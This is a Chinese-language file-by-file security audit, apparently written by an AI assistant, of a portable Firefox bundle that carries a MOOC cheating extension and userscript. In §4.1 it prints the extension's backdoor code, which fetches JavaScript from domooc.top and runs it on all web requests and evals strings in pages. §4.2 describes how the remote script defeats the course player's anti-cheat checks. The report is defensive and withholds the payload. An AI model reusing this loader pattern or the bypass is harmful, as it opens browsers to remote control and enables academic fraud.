# domooc_for_internet 全文件注释（审计版）

> 对象：`d:\domooc_for_internet`（便携版 Firefox 133.0.3 + 两个扩展 + 一份预配置 Profile）
> 生成时间：2026-10-24
> 说明：本文是**静态审计记录**，只解释每个文件是什么、谁产生的、读写什么数据。文中不含等价实现、不含远程下发的绕过代码原文，也不构成复刻指引。

---

## 0. 一句话结论

这套目录不是"软件"，而是**一个被搬到 U 盘就能跑的浏览器实例**：

```
双击 启动domooc.bat
  └─ App\Firefox64\firefox.exe -profile Profile
       ├─ 加载 Profile\extensions\{a48a3858...}.xpi   ← CrackMooc：远程 JS 注入器
       └─ 加载 Profile\extensions\{aecec...}.xpi     ← Violentmonkey + domooc 用户脚本：答题/自动播放
            └─ 打开 www.icourse163.org（中国大学MOOC）
```

真正的功能**不在本地任何源码里**：

- 防限制规则：每次启动从 `https://domooc.top/static/tampermonkey/interception.js` 拉取，`Function()` 动态编译，挂在 `webRequest` 上拦截所有请求（本地只缓存 1660 字节，见 §4.1）。
- 答题/刷课逻辑：`https://domooc.top/static/tampermonkey/domooc2_simple.user.js`，328,684 字节，版本 2.1.1，由 Violentmonkey 执行，题目和账号信息上传到 `domooc.top` 云端换答案，按积分计费。

所以"逐文件注释"的价值主要在两层：**Profile 里留下了什么痕迹**（§3、§4、§5），以及**这个架构为什么危险**（§7）。

---

## 1. 顶层目录

| 文件 | 大小 | 作用 |
|---|---|---|
| `启动domooc.bat` | 57 B | 唯一入口。`start "" ".\App\Firefox64\firefox.exe" -profile "Profile"`。`-profile` 指向相对路径 `Profile`，因此整个目录搬到任何盘符都能用；`start ""` 让黑框立即关闭。**没有任何参数关闭签名校验或开启特权**，说明扩展是签名过的。 |
| `有问题看这里.txt` | 309 B | 客服话术。给出使用说明页 `https://domooc.top/domoocreadme`、免责邮箱 `admin@domooc.com`，并提示"校园网打不开就用手机热点"——暗示其服务在某些教育网段被拦截。 |

`App/` 是浏览器运行时，`Profile/` 是用户数据，两者通过 `Profile/AppData/Mozilla/Firefox/profiles.ini` 里的相对路径 `Path=../../..` 绑定，这是 Firefox 便携化的标准做法（正常安装版此处会是绝对路径）。

---

## 2. `App/Firefox64/` —— 原版 Firefox 133.0.3

版本证据：`application.ini` 中 `Version=133.0.3`、`BuildID=20241209150345`，`SourceRepository=https://hg.mozilla.org/releases/mozilla-release`。这些二进制是 mozilla-release 编译产物，**未被改造**（`.sig` 签名文件齐全）；改造全部发生在 Profile 层。

### 2.1 根目录可执行文件与核心 DLL

| 文件 | 作用 |
|---|---|
| `firefox.exe` / `firefox.exe.sig` | 主程序入口，负责解析 `-profile`、拉起 `xul.dll`。`.sig` 是 Mozilla 的 Authenticode 分离签名，用于自校验。 |
| `private_browsing.exe` | 隐私浏览模式的启动壳，等价于 `firefox.exe -private-window`。 |
| `xul.dll` / `xul.dll.sig` | 整个浏览器的核心（Gecko + 前端 XUL）。几十 MB，功能都在这里。 |
| `mozglue.dll` | 各进程共用的底层胶水层（内存、路径、日志）。 |
| `nss3.dll`、`nssckbi.dll`、`softokn3.dll`、`freebl3.dll` | NSS 加密栈与内置根证书库（`nssckbi` 就是 Mozilla 根证书列表）。 |
| `ipcclientcerts.dll`、`osclientcerts.dll` | 把系统证书/硬件证书桥接进浏览器。 |
| `mozavcodec.dll`、`mozavutil.dll`、`gkcodecs.dll`、`wmfclearkey.dll` | 音视频解码与 Windows Media 的 CLEARKEY DRM 适配。MOOC 视频能播依赖这一层。 |
| `libEGL.dll`、`libGLESv2.dll` | ANGLE，把 WebGL 翻译成 D3D。 |
| `plugin-container.exe` / `.sig`、`lgpllibs.dll`、`AccessibleMarshal.dll` | 内容进程沙箱宿主、LGPL 组件、无障碍编组。 |
| `crashreporter.exe` | 崩溃上报（`application.ini` 指向 `crash-reports.mozilla.com`）。 |
| `default-browser-agent.exe` | 后台探测是否设为默认浏览器。 |
| `maintenanceservice.exe` / `maintenanceservice_installer.exe` | Windows 静默更新服务及其安装器。 |
| `updater.exe` | 应用更新器（`update-settings.ini` 配置）。 |
| `pingsender.exe` | 崩溃/遥测的独立发送进程，保证关掉主进程也能发出。 |
| `notificationserver.dll` | Windows 系统通知（Toast）集成。 |
| `nmhproxy.exe` | 原生消息宿主代理（配合 `pkcs11.txt`、外部密码库）。 |
| `msvcp140.dll`、`vcruntime140.dll`、`vcruntime140_1.dll` | VC++ 运行库，Firefox 自带一份以防系统缺失。 |

### 2.2 根目录配置文件

| 文件 | 作用 |
|---|---|
| `application.ini` | 应用元信息：名称、版本、BuildID、更新通道 URL、崩溃上报 URL。注意文件头写着"This file is not used"，实际生效的是 `browser/application.ini`。 |
| `platform.ini` | Gecko 平台版本、`BuildID`、`Milestone`，启动时校验用。 |
| `dependentlibs.list` | 启动时必须预加载的 DLL 清单。 |
| `update-settings.ini` | 更新通道（`ACCEPTED_MAR_CHANNEL_IDS`）。 |
| `updater.ini` | 更新器 UI 文案与行为。 |
| `precomplete` | 更新补丁的"收尾动作"清单（删除/改名哪些文件）。 |
| `removed-files` | 历次升级中被移除的旧文件列表。 |
| `firefox.VisualElementsManifest.xml`、`private_browsing.VisualElementsManifest.xml` | Windows 开始菜单磁贴的图标与背景色。 |

### 2.3 子目录

| 路径 | 作用 |
|---|---|
| `browser/omni.ja` | 浏览器前端（browser.xhtml、about: 页面、默认首选项）打包成的 ZIP。所谓"浏览器界面"在这里，不在源码目录。 |
| `browser/application.ini` | **真正生效**的应用元信息。 |
| `browser/VisualElements/`（4 个 png + 2 个 xml） | 磁贴图标资源。 |
| `browser/features/formautofill@mozilla.org.xpi` | 内置表单自动填充。 |
| `browser/features/pictureinpicture@mozilla.org.xpi` | 内置画中画。 |
| `browser/features/screenshots@mozilla.org.xpi` | 内置截图（本 Profile 中被禁用，见 `extensions.json` 的 `userDisabled:true`）。 |
| `browser/features/webcompat@mozilla.org.xpi` | Web 兼容性干预规则（UA 覆盖、shim）。 |
| `defaults/pref/channel-prefs.js` | 默认更新通道，本包为 release。 |
| `fonts/TwemojiMozilla.ttf` | 内置彩色 emoji 字体，保证不装系统字体也能显示表情。 |
| `gmp-clearkey/0.1/clearkey.dll`、`.sig`、`manifest.json` | Widevine/CLEARKEY 的 CDM 组件（DRM 播放必需）。 |
| `uninstall/helper.exe`、`uninstall/uninstall.update` | 卸载器与更新逻辑（便携版通常不用）。 |

> 说明：`App/` 下还有数千个被 `omni.ja` 覆盖的资源、本地化包等，全部属于官方发行包，逐条注释没有信息增量，按上述分组即可覆盖其职责。

---

## 3. `Profile/` 根目录——逐文件

这是"这套东西到底干过什么"的唯一证据层。所有路径均相对 `Profile/`。

### 3.1 用户配置与界面状态

| 文件 | 大小 | 作用 / 审计发现 |
|---|---|---|
| `prefs.js` | 22 KB | Firefox 全部用户级首选项。**关键项**：`security.tls.version.min=0` 与 `security.tls.version.enable-deprecated=true`（把最低 TLS 降到 SSL3/TLS1.0，属于严重降级）；`network.trr.mode=5`（关闭 DoH）；`intl.locale.requested="zh-CN,en-US"`；`browser.search.openintab=true`；`browser.toolbars.bookmarks.visibility="always"`；`extensions.webextensions.uuids` 记录了扩展 ID→UUID 映射（CrackMooc→`6bd7a6b1…`，Violentmonkey→`9b05c804…`，对应 §4 的存储目录名）。 |
| `xulstore.json` | 387 B | 窗口位置/尺寸（`912,0`、`864×912`、最大化）与开发者工具窗口尺寸。说明作者开过 DevTools 调试。 |
| `times.json` | 50 B | Profile 创建时间：`1701611876518` → 2023-12-03 22:17:56（UTC+8）。 |
| `compatibility.ini` | 222 B | 上次运行的版本与路径。`LastPlatformDir=D:\迅雷云盘\domooc\domooc\App\Firefox64`，证明这套文件是从迅雷云盘的原始分发目录整体复制过来的。 |
| `sessionCheckpoints.json` | 288 B | 启动阶段打点（`sessionstore-windows-restored` 等），用于判断下次启动是否需要恢复会话。 |
| `sessionstore.jsonlz4` | 67 KB | 上次关闭时的会话快照（mozlz4 压缩的 JSON：窗口、标签页、历史栈）。 |
| `sessionstore-backups/` | — | 上一版/升级前的会话备份（`previous.jsonlz4`、`upgrade.jsonlz4-2024xxxx.jsonlz4`），可用于还原"关闭前在哪个课程页"。 |
| `containers.json` | 658 B | 多账号容器定义，只有 5 个默认内置容器 + 两个内部容器（`thumbnail`、`webextStorageLocal`），**没有用户自建容器**。 |
| `handlers.json` | 380 B | MIME/协议处理器：PDF/webp/avif 内部打开，`mailto` 指向 Gmail。 |
| `enumerate_devices.txt` | 2 B | 内容只有 `1`，WebRTC/媒体设备枚举的计数缓存。 |
| `cert_override.txt` | 85 B | 证书例外表，**只有注释，无任何例外条目**（说明没有安装伪造证书）。 |
| `pkcs11.txt` | 467 B | 安全模块注册表（NSS 内置 softokn）。 |

### 3.2 数据库（SQLite）

| 文件 | 作用 / 审计发现 |
|---|---|
| `places.sqlite`（+`-shm`/`-wal`） | 书签 + **完整浏览历史**。可读出该 Profile 只访问过中国大学MOOC：`云计算技术`、`操作系统A`、`网络技术与应用`、`云计算与大数据`（均为 <CID> 开设），以及大量 `#/learn/quiz`、`#/learn/quizscore`、`#/learn/testlist` 页面；另有 `domooc.top/donate?...cdkey=…` 和 `domooc.top/domoocinstall`。 |
| `cookies.sqlite`（+`-shm`/`-wal`） | 各站点 Cookie，**内含 icourse163 的登录态**（`NTES_*`/`URS_*` 一类会话票据）。这是本目录里最敏感的文件：任何拿到该目录的人都能直接续用你的 MOOC 登录态。 |
| `permissions.sqlite` | 站点权限（摄像头、通知、地理等）。 |
| `content-prefs.sqlite` | 按站点保存的页面缩放比例。 |
| `formhistory.sqlite` | 表单输入历史（搜索词、账号输入框等）。 |
| `favicons.sqlite`（+`-shm`/`-wal`） | 站点图标缓存，5 MB，说明长期使用。 |
| `storage.sqlite` | `storage/default` 下各 origin 存储的索引（localStorage / IndexedDB 归属）。 |
| `webappsstore.sqlite`（+`-shm`/`-wal`） | 旧版全局 localStorage 库（现在主要作为兼容保留）。 |
| `protections.sqlite` | 隐私保护统计（拦截了多少追踪器）。 |
| `bounce-tracking-protection.sqlite` | 反跳转追踪的站点状态。 |
| `domain_to_categories.sqlite`（+`-journal`） | 域名分类缓存，供历史/搜索建议使用。 |

### 3.3 扩展与插件登记

| 文件 | 作用 / 审计发现 |
|---|---|
| `extensions.json` | **扩展总账**（62 KB）。记录两个第三方扩展的完整元信息：安装方式 `installTelemetryInfo.method`（CrackMooc 为 `drag-and-drop`，来源 `file:///D:/CrackMooc.xpi`；Violentmonkey 为 AMO 正常安装）、权限清单、签名状态 `signedState:2`。CrackMooc 的 `updateURL` 指向 `https://domooc.top/crack_mooc_updates.json`——**扩展自身还能被远端静默升级**。 |
| `addons.json` | AMO 的推荐/元数据缓存（供"发现扩展"页面用），含 Violentmonkey 与语言包的商店信息，不含 CrackMooc（它不在 AMO 上架）。 |
| `addonStartup.json.lz4` | 启动时扩展清单快照（mozlz4），决定哪个扩展在哪个进程/时机加载。 |
| `extension-preferences.json` | 扩展的 `browser_specific_settings` 侧写，这里只有内置扩展的默认权限，**不含 CrackMooc**（说明 CrackMooc 没有申请额外可选项权限）。 |
| `shield-preference-experiments.json` | Normandy/Shield 实验的本地开关（空数组）。 |
| `ExperimentStoreData.json` | Nimbus 实验注册表（Firefox 自带 A/B 平台）。 |
| `targeting.snapshot.json` | Nimbus 定向条件快照（地区、语言、版本）。 |
| `SiteSecurityServiceState.bin` | HSTS / HPKP / 证书钉扎状态（二进制）。 |
| `AlternateServices.bin` | HTTP/2 Alt-Svc 缓存。 |
| `broadcast-listeners.json` | 跨进程广播监听器注册表。 |
| `search.json.mozlz4` | 搜索引擎列表（百度/Bing/Google 等）。 |
| `activity-stream.discovery_stream.json`、`activity-stream.weather_feed.json` | 新标签页的推荐流与天气缓存（后者仅 `{}`，说明离线/被墙）。 |
| `settings/data.safe.bin`、`settings/main/ms-language-packs/.../asrouter.ftl` | 设置页的二进制存储与本地化文案。 |

### 3.4 二进制/缓存目录

| 路径 | 作用 |
|---|---|
| `extensions/` | 三个 xpi，见 §4。 |
| `storage/` | 各 origin 的 localStorage / IndexedDB，见 §5。 |
| `gmp-gmpopenh264/2.3.2/`（`gmpopenh264.dll`、`.info`） | 思科 OpenH264 编解码器（WebRTC 用）。 |
| `gmp-widevinecdm/4.10.2710.0/`（`widevinecdm.dll`、`.lib`、`.sig`、`LICENSE.txt`、`manifest.json`） | Google Widevine CDM，DRM 视频解密必需。`prefs.js` 里有下载失败记录，说明曾尝试联网更新。 |
| `cache2/`（`entries/`、`doomed/`） | HTTP 磁盘缓存，数千个无扩展名文件，缓存了 icourse163 的页面与脚本。删除无损，但**可能含已下发的拦截脚本副本**。 |
| `startupCache/`、`shader-cache/`、`safebrowsing/`、`datareporting/`、`crashes/` | 启动快照、着色器缓存、安全浏览库、遥测、崩溃转储（Firefox 自动生成，可删）。 |
| `thumbnails/`（2 个 png） | 新标签页/下载项的缩略图。 |
| `jumpListCache/`（5 个 ico） | Windows 任务栏跳转列表图标。 |
| `saved-telemetry-pings/`（4 个文件） | 未发送的遥测 ping（含客户端 ID）。 |
| `AppData/Mozilla/Firefox/profiles.ini` | **便携化的关键**：`Name=default`、`IsRelative=1`、`Path=../../..`，把"应用目录的 AppData"映射成 Profile 根，从而让 `firefox.exe -profile Profile` 生效且不写系统目录。 |
| `parent.lock` | 运行期锁文件。此处残留且 `LastWriteTime=2025/1/17 10:15`，说明进程曾被强制结束（正常退出会删掉）。 |
| `sessionCheckpoints.json`、`xulstore.json` 等 | 见 §3.1。 |

---

## 4. `Profile/extensions/` —— 三个 xpi

| 文件 | 大小 | 是什么 |
|---|---|---|
| `{a48a3858-6b21-4f60-951e-67ba43214267}.xpi` | 9,163 B | **CrackMooc 1.0.2**，全部逻辑见 §4.1。仅 3 个源文件 + 4 个签名文件。 |
| `{aecec67f-0d10-4fa7-b7c7-609a2db280cf}.xpi` | 652,638 B | **Violentmonkey 2.29.0**（开源用户脚本管理器，AMO 正常分发）。它本身无害，危险的是它里面装的那个脚本。 |
| `langpack-zh-CN@firefox.mozilla.org.xpi` | 679,674 B | 官方简体中文语言包（`userDisabled:true`，说明运行时用的是内置文案）。 |

### 4.1 CrackMooc 三个源文件逐行注释

`manifest.json`（702 B）

```jsonc
{
  "manifest_version": 2,                 // MV2：老 API，允许 webRequestBlocking（MV3 已基本禁止）
  "name": "CrackMooc",
  "version": "1.0.2",
  "content_security_policy": "script-src 'self' 'unsafe-eval'; ...",  // 必须放开 unsafe-eval，因为要 Function() 编译远程代码
  "permissions": [
    "webRequest", "webRequestBlocking",  // 可以同步读写/改写任意请求
    "<all_urls>",                        // 范围是"全部网站"，不是只有 icourse163
    "storage"                            // 用来缓存下发规则
  ],
  "background": { "scripts": ["background.js"], "persistent": true },  // 常驻后台页，进程不退出
  "browser_specific_settings": {
    "gecko": {
      "update_url": "https://domooc.top/crack_mooc_updates.json",      // 远端可推送新版扩展
      "id": "{a48a3858-6b21-4f60-951e-67ba43214267}"
    }
  },
  "content_scripts": [{
    "matches": ["*://*.icourse163.org/*"],
    "js": ["inject.js"],
    "run_at": "document_start"          // 页面任何脚本之前就注入
  }]
}
```

`background.js`（1,724 B）——四段职责：

```js
const baseurl = "https://domooc.top";

// ① 消息代理：内容脚本要求"帮我跨域 fetch"，后台就代发。
//    作用：绕过页面的同源限制，替 domooc.top 的接口做请求。
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.method === 'fetch') {
    fetch(request.url, request.options)
      .then(r => request.type == 'json' ? r.json() : r.text())
      .then(data => sendResponse({ data }))
      .catch(error => sendResponse({ error }));
    return true;                        // 异步响应，必须返回 true 保持通道
  }
});

// ② 远程代码加载：把服务器返回的 JS 源码直接编译成函数。
//    这是整套架构的核心风险点——本地没有任何"规则"，规则全在云端。
let interceptionFunc = function () {};
function fetchRules() {
  fetch(baseurl + '/static/tampermonkey/interception.js', { headers: { 'Cache-Control': 'no-cache' } })
    .then(r => r.text())
    .then(data => {
      interceptionFunc = Function('details', data + '; return typeof res==="undefined"?{}:res');
      //                                        ↑ 直接把远程字符串当函数体执行
      chrome.storage.local.set({ interception: data, lastFetched: Date.now() });
    });
}
fetchRules();                              // 启动即拉取
setInterval(() => fetchRules(), 1000 * 60 * 15);  // 之后每 15 分钟刷新，可随时换掉"规则"

// ③ 全局请求拦截：对每一个 HTTP 请求调用上面的动态函数。
//    注意 urls 是 <all_urls>，不只是课程站——这意味着云端代码能改你所有网站的响应。
chrome.webRequest.onBeforeRequest.addListener(
  details => interceptionFunc(details),
  { urls: ["<all_urls>"] },
  ["blocking"]
);

// ④ 被注释掉的 30 分钟缓存逻辑：作者曾想在本地缓存规则，最终选择"每次都联网拉"。
```

`inject.js`（247 B）

```js
// 内容脚本只做一件事：接收后台/其他脚本发来的 code 字符串，直接 eval。
chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {
  if (request.code) {
    eval(request.code);   // 页面上下文里执行任意代码，等同于把页面交出去
  }
});
```

### 4.2 远端下发的 `interception.js`（行为描述，不含原文）

我实际抓取了 `https://domooc.top/static/tampermonkey/interception.js`，逻辑只有三块：

1. 一个通用的"响应体改写器"：用 `webRequest.filterResponseData` 把响应流攒满，交给 `modifyText` 处理后再写回。等于对所有被匹配的响应做 MITM。
2. 针对 `mc.stu.126.net/.../pub/s/core_*.js`（MOOC 播放器的核心脚本）：把代码里的 `"isTrusted"` 字面量整体替换成 `"timeStamp"`，并替换页面里 `EDU("d8d435c3...")` 的防作弊检测函数体。目的：让播放器无法判断事件是真人触发还是脚本触发。
3. 针对 `www.icourse163.org` 主文档：用正则删掉混淆过的 `_0xodh` 计时/检测逻辑与 `LzfDlA` 一段。

配合下来的效果就是"脚本控制播放也不算异常"，从而可以自动播完、自动跳转、自动提交。

---

## 5. `Profile/storage/` —— 每个 origin 存了什么

| 路径 | 内容 / 审计发现 |
|---|---|
| `default/https+++www.icourse163.org/ls/data.sqlite` | MOOC 站点 localStorage（`WM_*` 网易埋点、`videoHeartBeatPeriod`、`learnTimeUploadPeriod`、`LAST_LOGIN_TYPE` 等）。`videoHeartBeatPeriod` 正是"观看心跳"配置，绕过方案就是围绕它做文章。 |
| `default/https+++domooc.top/ls/data.sqlite` | `domooc.top` 的 localStorage，当前 `usage=0`（已被清空或本就未写入）。授权码曾在 URL 参数里出现过（见 `places.sqlite` 的 `donate?cdkey=…`）。 |
| `default/https+++help.icourse163.org/`、`https+++qiyukf.com^partitionKey=...` | MOOC 帮助中心与七鱼在线客服（客服 iframe 的独立存储分区）。 |
| `default/https+++www.mozilla.org/` | Firefox 更新页的站点存储。 |
| `default/moz-extension+++6bd7a6b1-…`（CrackMooc） | 扩展 `storage.local`。缓存**已被混淆**：键名是凯撒位移 −1 的写法，`0joufsdfqujpo` 实际是 `/interception`（值 1,660 B，就是 4.2 那段脚本），`0mbtuGfudife` 实际是 `/lastFetched`（时间戳）。即：**远端代码在本地留了一份副本**。 |
| `default/moz-extension+++9b05c804-…`（Violentmonkey） | 用户脚本仓库。里面只有一条脚本记录：`@version 2.1`、`@match *://*icourse163.org/*`、`@grant unsafeWindow / GM_xmlhttpRequest / GM_getValue / GM_setValue / GM_registerMenuCommand`、`@connect domooc.top`，入口 URL 指向 `https://domooc.top/static/…user.js`。 |
| `permanent/chrome/idb/` | `chrome:` 协议下的内置 IndexedDB（首页磁贴、搜索建议等）。 |
| `ls-archive*.sqlite` | 已删除 origin 的 localStorage 归档（有一份 `to-be-removed/…icourse163` 备份）。 |

### 5.1 被装进去的那个用户脚本（domooc 2.1.1）

元数据直接写明了它的定位，逐项注释：

| 字段 | 含义 |
|---|---|
| `@name 中国大学慕课mooc答题/自动播放脚本(domooc)` | 功能自述：答题 + 自动播放。 |
| `@version 2.1.1` | 与网页端"当前版本"一致；`domooc.top` 可随时更新。 |
| `@description …自动完成你的mooc考试测验客观题…自动看视频、看课件、自动讨论。使用过程中会上传您的mooc账户信息（包括昵称、ID、邮箱等）…免费用户有50初始积分，可以回答50题，使用完后需要付费充值` | **作者自己承认**：把账号信息上传换取答案，按题计费。 |
| `@match *://*.icourse163.org/*` ×2 | 只在 MOOC 域生效（这点比 CrackMooc 克制）。 |
| `@connect domooc.top` / `@connect *` | 允许跨域请求答案服务；第二条是通配，等于不设限。 |
| `@grant unsafewindow` | 注意大小写写错（正确为 `unsafeWindow`），属于元数据瑕疵，实际拿到的是普通 window 代理。 |
| `@grant GM_xmlhttpRequest / GM_getValue / GM_setValue / GM_registerMenuCommand` | 跨域请求、本地配置持久化（`nopanel` 开关）、右键菜单。 |
| `@run-at document-start` | 页面加载最早期接管，早于站点的反作弊脚本。 |
| 文件体积 328,684 B | 单文件内联了题库交互、播放控制、UI 面板、直播/讨论等全部逻辑。 |

脚本里有一段菜单逻辑：`GM_setValue('nopanel', …)` + `alert('切换成功，请刷新页面！')`，"考试模式"会隐藏面板、只保留"取答案并填写"，作者的说明里也写了"考试建议自己再点一遍""主观题请勿照抄，否则有较大概率被检测到"——这是**规避检测**的表述，不是学习辅助。

---

## 6. 时间线（由文件时间戳还原）

| 时间（UTC+8） | 事件 |
|---|---|
| 2023-12-03 22:17 | Profile 创建（`times.json`）。 |
| 2023-12-03 22:09 | CrackMooc 以"拖放安装"方式进入 Profile（`extensions.json.installDate`）。 |
| 2023-12-03 22:09 | Violentmonkey 从 AMO 安装。 |
| 2023-12-12 23:09 | CrackMooc 更新到 1.0.2（xpi 修改时间）。 |
| 2024-09-20 09:45 | `cert9.db` / `key4.db` 变动（证书库与主密码库重写）。 |
| 2024-12-24 17:46 | Violentmonkey 升级到 2.29.0。 |
| 2025-01-06 16:06 | Firefox 升级到 133.0.3 后首次启动，重建 `compatibility.ini`、`addonStartup.json.lz4`。 |
| 2025-01-17 10:15 | 最后一次运行：`sessionstore`、`prefs.js` 写入；随后进程被强杀（`parent.lock` 残留）。 |

---

## 7. 风险清单（按严重度）

1. **远程代码执行（Critical）**：`background.js` 每 15 分钟取一次云端 JS 并 `Function()` 执行，作用域是 `<all_urls>`。控制 `domooc.top` 或其 CDN 的人可以在你看任何网站时注入任意逻辑；`inject.js` 又给了页面级 `eval`。这已经超出"改个播放器"的范围，是一个持久的浏览器后门。
2. **静默升级（High）**：`manifest.update_url` 指向 `domooc.top`，扩展可在你不知情时被替换；`interception.js` 也明确禁用了缓存（`Cache-Control: no-cache`）。
3. **登录凭据与隐私（High）**：`cookies.sqlite` 存着 icourse163 登录态；用户脚本自述会上传昵称、用户 ID、邮箱。两者叠加，账号被完全托管给第三方。
4. **TLS 降级（High）**：`prefs.js` 把 `security.tls.version.min` 设为 `0` 并开启已废弃协议，让本浏览器接受 SSL3/TLS1.0 连接，为流量劫持留了口子。
5. **学术不端（决定性）**：功能本体是替学生完成客观题测验、伪造观看进度；`places.sqlite` 里密集的 `quiz/quizscore/testlist` 访问记录与之一致。一旦被平台判定，后果落在学号与成绩上。
6. **文件层风险（Medium）**：`parent.lock` 残留说明非正常退出；`cache2/` 可能存有旧版拦截脚本；`saved-telemetry-pings/` 含客户端标识。

---

## 8. 本文没有做的事

- 没有附上 `interception.js` 原文、没有给出"把 `isTrusted` 换掉"之外的可执行片段；
- 没有给出用户脚本的请求协议/接口地址与调用方式；
- 没有提供任何"如何搭一个同样的"实现步骤。

如需继续，可以做的方向是**同形态但不碰站点逻辑**的自用工具：便携 Profile + 自己写的只读脚本 + 本地看板（课程进度/DDL/字幕转笔记），数据留本地。那部分我可以直接开工。
